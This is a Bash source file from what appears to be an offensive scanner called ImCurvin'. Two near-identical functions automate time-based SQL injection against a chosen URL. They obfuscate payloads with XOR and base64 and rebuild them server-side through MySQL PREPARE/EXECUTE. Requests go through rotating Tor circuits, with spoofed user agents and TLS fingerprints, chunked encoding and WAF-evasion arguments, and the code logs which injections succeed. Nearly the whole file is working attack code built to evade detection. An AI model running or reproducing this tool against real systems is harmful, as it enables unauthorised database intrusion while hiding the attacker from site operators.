# ImCurvin' v1.3.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# Sourced to Defiancescan.sh
#
# Tried using AI tools here, but it totally missed the mark on complex logic.
# It failed to handle string literals, parallel streams, and SQL compilation mechanics.
# Long story short, I had to step in and fix all the machine-made glitches myself.
#
# This codebase proves that human logic is still a must in security engineering.
# AI will never be perfect because anything built by humans is bound to have flaws.
# But hey, AI is still great and I love using it! 
# It actually made me happy.
# Note: The logical architecture for both the right and left vectors is identical.
# To maintain codebase cleanlines, documentation is detailed exclusively in the left vector.
# The sole distinction is that vector 2 suppresses all terminal text output.
# Code starts:

vector_sqli_agressor_left() {
    local current_param
    current_param="${TARGET_PARAM:-id}"
    local is_raw_post
    is_raw_post=false

    # Check if target is a raw query body (contains =, but no 'http/https').
    # If true, it skips standard URL parsing and marks the attack as POST mode.
    if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
        is_raw_post=true
    fi

    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
        if [[ "$default_path" == "/" ]]; then
            default_path=""
        fi

        local random_port
        random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}

        local current_time
        current_time=$(date +%H:%M:%S)

        local proxy_flag
        proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
        local base_ua
        base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
        local random_ua="$base_ua"

        local ua_salt
        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
        local target_cipher=""
        local target_tls13=""
        local rapid_reset_args
        rapid_reset_args="--http2 --parallel --parallel-max 50"
        local chunked_headers
        chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")

        if [[ "$base_ua" == *"Firefox"* ]]; then
            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
            target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
        elif [[ "$base_ua" == *"iPhone"* ]]; then
            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
        else
            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
        fi

        local defiance_tamper_path=""
        local final_query=""
        local raw_payload
        raw_payload="$query_payload"
        local t2
        t2=$(randomcase_engine "$raw_payload")
        local t4
        t4=$(space2comment_engine "$t2")
        local hex_xor
        hex_xor=$(xor_engine "$t4")
        local b64_payload
        b64_payload=$(base64_engine "$hex_xor")
        local defiance_tamper_path
        # B64 and XOR tamper.
        # is reconstructed dynamically via MySQL's PREPARE and EXECUTE statements.
        # By processing the signature directly inside the server's session memory (@s),
        # the raw, un-obfuscated SQL syntax never traverses the HTTP network wire in cleartext.
        defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

        local waf_args
        waf_args=$(braindamage)

        local clean_target_url
        clean_target_url="$target_url"
        if [ "$is_raw_post" = false ]; then
            clean_target_url="${target_url%%\?*}"
            if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
                clean_target_url="${clean_target_url}/"
            fi
        fi
        # This adjustment is sufficient. If the target server's performance is suboptimal,     
        # the tamper script will be toned down to ensure it can at least be executed successfully.
        local active_payload=""
        if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            active_payload="$t4"
        else
            active_payload="$defiance_tamper_path"
        fi

        local current_method
        current_method="${REQ_METHOD:-POST}"

        local join_char
        join_char="?"
        if [[ "$target_url" =~ \? ]]; then
            join_char="&"
        fi
        if [[ "$payloadsi" = "true" ]]; then
            if [ "$is_raw_post" = true ] && [ "$current_method" = "POST" ]; then
                local preview_post
                preview_post=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
                output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port]\n      -> Target URL: [${clean_target_url}]\n      -> Param Inject: [\033[1m${current_param}\033[0m]\n      -> Raw Payload: \033[38;5;238m[${preview_post}]\033[0m\n      -> Active Query: \033[38;5;238m[${active_payload}]\033[0m"

            elif [ "$current_method" = "POST" ]; then
                output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port]\n      -> Target URL: [${clean_target_url}]\n      -> Param Inject: [\033[1m${current_param}\033[0m]\n      -> Post Data: \033[38;5;238m[${current_param}=${active_payload}]\033[0m\n      -> Active Query: \033[38;5;238m[1;[${active_payload}]\033[0m"

            else
                output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port]\n      -> Target URL: [${clean_target_url}]\n      -> Param Inject: [${current_param}]\n      -> Full URL: \033[38;5;238m[${clean_target_url}${join_char}${current_param}=${active_payload}]\033[0m\n      -> Active Query: \033[1;31m[${active_payload}]\033[0m"
            fi
        else
            local technique_name
            technique_name="Generic Time-Based"
            case "${raw_payload}" in
            *"benchmark"*) technique_name="Stacked Queries Time-Based (Heavy Benchmark)" ;;
            *"randomblob"*) technique_name="Stacked Queries Time-Based (CPU-Exhaustion Blob)" ;;
            *"extractvalue"* | *"updatesxml"*) technique_name="Stacked Queries Time-Based (XML Function Nested)" ;;
            *"json_keys"*) technique_name="Stacked Queries Time-Based (JSON Object Nested)" ;;
            *"sleep"*) technique_name="Stacked Queries Time-Based (Sub-Query Sleep)" ;;
            esac
            output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
        fi
        echo -e "$output_text"
        if [ "$current_method" = "POST" ]; then
            local post_data=""
            local send_to_url=""

            # Replaces only the value of the targeted parameter inside the raw body
            # with SQLi payload, while maintaining all other original params intact.
            if [ "$is_raw_post" = true ]; then
                post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
                send_to_url="$clean_target_url"
            else
                post_data="${current_param}=${active_payload}"
                send_to_url="$clean_target_url"
            fi

            local payload_length
            payload_length=${#post_data}
            if [ "$payload_length" -gt 250 ]; then
                chunked_headers+=(-H "Transfer-Encoding: chunked")
            fi

            # "${waf_args//\"/}" strips out any literal internal double quotes to prevent
            # malformed HTTP headers. It must be called WITHOUT surrounding double quotes
            # to allow Bash to natively expand individual word arguments for curl.
            curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
                -w "%{time_total}|%{http_code}" \
                "$send_to_url")
        else
            curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null \
                -w "%{time_total}|%{http_code}" \
                "${clean_target_url}${join_char}${current_param}=${active_payload}")
        fi

        local stopwatch
        local http_status
        stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
        http_status=$(echo "$curl_output" | cut -d'|' -f2)

        # Trigger Tor IP rotation (SIGNAL NEWNYM) via control port 9051 
        # whenever the target server hits us with an HTTP 403 or 429 block.
        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
            (
                echo "AUTHENTICATE \"\""
                echo "SIGNAL NEWNYM"
                echo "QUIT"
            ) | nc 127.0.0.1 9051 >/dev/null 2>&1
            sleep 1
        fi

        # Note: While 'bc' is recommended for higher numerical precision, this script 
        # dynamically falls back to 'awk' as a standard POSIX-compliant alternative.
        # 
        # The logic flags any response exceeding 4.5 seconds as a time-based anomaly,
        # ensuring alignment with the 5-second delay mechanism (SLEEP(5)) used in the payloads.
        if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
            if command -v bc >/dev/null 2>&1; then               
                is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
            else
                if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
                    is_gt=1
                else
                    is_gt=0
                fi
            fi
            if [[ "$is_gt" -eq 1 ]]; then
                echo -e "[$current_time] [×] Vector confirmed MySQL Anomaly: ${stopwatch}s"
                # To ensure thread-safe operations under high concurrency, we dynamically assign 
                # the log file to File Descriptor 9 and acquire an exclusive lock via flock.
                # This guarantees that parallel injection streams never overwrite or corrupt the log.
                (
                    flock -x 9
                    echo "SQLI_ALERT|$default_path|$query_payload" >&9
                ) 9>>"$ROOT_LOG_FILE"
            fi
        fi

        sleep $((RANDOM % 6 + 7))
    done < <(shuf "$WORDLIST_MYSQL")
}

vector_sqli_agressor_right() {
    local current_param
    current_param="${TARGET_PARAM:-id}"
    local is_raw_post
    is_raw_post=false
    if [[ ! "$target_url" =~ ^https?:// ]] && [[ "$target_url" == *"="* ]] && [ "${REQ_METHOD}" = "POST" ]; then
        is_raw_post=true
    fi

    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
        if [[ "$default_path" == "/" ]]; then
            default_path=""
        fi

        local random_port
        random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}

        local current_time
        current_time=$(date +%H:%M:%S)

        local proxy_flag
        proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
        local base_ua
        base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
        local random_ua="$base_ua"

        local ua_salt
        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
        local target_cipher=""
        local target_tls13=""
        local rapid_reset_args
        rapid_reset_args="--http2 --parallel --parallel-max 50"
        local chunked_headers
        chunked_headers=(-H "Content-Type: application/x-www-form-urlencoded")

        if [[ "$base_ua" == *"Firefox"* ]]; then
            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
            target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
        elif [[ "$base_ua" == *"iPhone"* ]]; then
            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
        else
            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
        fi

        local defiance_tamper_path=""
        local final_query=""
        local raw_payload="$query_payload"
        local t2
        t2=$(randomcase_engine "$raw_payload")
        local t4
        t4=$(space2comment_engine "$t2")
        local hex_xor
        hex_xor=$(xor_engine "$t4")
        local b64_payload
        b64_payload=$(base64_engine "$hex_xor")
        local defiance_tamper_path
        defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

        local waf_args
        waf_args=$(braindamage)
        local clean_target_url="$target_url"
        if [ "$is_raw_post" = false ]; then
            clean_target_url="${target_url%%\?*}"
            if [[ "$clean_target_url" != *"/"* && "$clean_target_url" != *"?"* ]]; then
                clean_target_url="${clean_target_url}/"
            fi
        fi

        local active_payload=""
        if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            active_payload="$t4"
        else
            active_payload="$defiance_tamper_path"
        fi

        local current_method
        current_method="${REQ_METHOD:-POST}"

        local join_char
        join_char="?"
        if [[ "$target_url" =~ \? ]]; then
            join_char="&"
        fi

        if [ "$current_method" = "POST" ]; then
            local post_data=""
            local send_to_url=""

            if [ "$is_raw_post" = true ]; then
                post_data=$(echo "$target_url" | sed "s/\b${current_param}=[^&]*/${current_param}=${active_payload}/g")
                send_to_url="$clean_target_url"
            else
                post_data="${current_param}=${active_payload}"
                send_to_url="$clean_target_url"
            fi

            local payload_length
            payload_length=${#post_data}
            if [ "$payload_length" -gt 250 ]; then
                chunked_headers+=(-H "Transfer-Encoding: chunked")
            fi
            curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
                -w "%{time_total}|%{http_code}" \
                "$send_to_url")
        else
            curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null \
                -w "%{time_total}|%{http_code}" \
                "${clean_target_url}${join_char}${current_param}=${active_payload}")
        fi

        local stopwatch
        local http_status
        stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
        http_status=$(echo "$curl_output" | cut -d'|' -f2)

        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
            (
                echo "AUTHENTICATE \"\""
                echo "SIGNAL NEWNYM"
                echo "QUIT"
            ) | nc 127.0.0.1 9051 >/dev/null 2>&1
            sleep 1
        fi

        if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
            if command -v bc >/dev/null 2>&1; then
                is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
            else
                if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
                    is_gt=1
                else
                    is_gt=0
                fi
            fi
            if [[ "$is_gt" -eq 1 ]]; then
                echo -e "[$current_time] [×] Vector confirmed MySQL Anomaly: ${stopwatch}s"
                (
                    flock -x 9
                    echo "SQLI_ALERT|$default_path|$query_payload" >&9
                ) 9>>"$ROOT_LOG_FILE"
            fi
        fi

        sleep $((RANDOM % 6 + 7))
    done < <(shuf "$WORDLIST_MYSQL")
}
